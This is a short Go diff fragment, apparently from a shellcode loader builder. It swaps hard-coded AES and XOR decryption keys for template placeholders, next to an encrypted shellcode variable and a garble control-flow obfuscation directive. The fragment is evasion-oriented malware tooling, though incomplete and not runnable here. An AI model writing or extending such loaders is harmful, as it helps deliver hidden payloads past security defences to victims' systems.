@@ -22,9 +22,9 @@ import (
 var encryptedShellcode []byte
 
 var (
-	aesKey, _    = hex.DecodeString("d131cb517c2ca8b97b5bfc825f4c23b58a66cb572126fabe7b58a886534574b58b329a072827fbb97e08f9800b4e22ef8033cc517b24aabd2e59ff875b4872e4")
-	xorKey, _    = hex.DecodeString("d4609a507a76a9ef7752ff8c5a4b77e18367cf572c2ca8ee760aae835c1b74e2")
-	XORAESKey, _ = hex.DecodeString("b204f8321814cbdc4f6b9db46a7d47d7")
+	aesKey, _    = hex.DecodeString("%KEYAES%")
+	xorKey, _    = hex.DecodeString("%KEYXOR%")
+	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
 )
 
 //.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
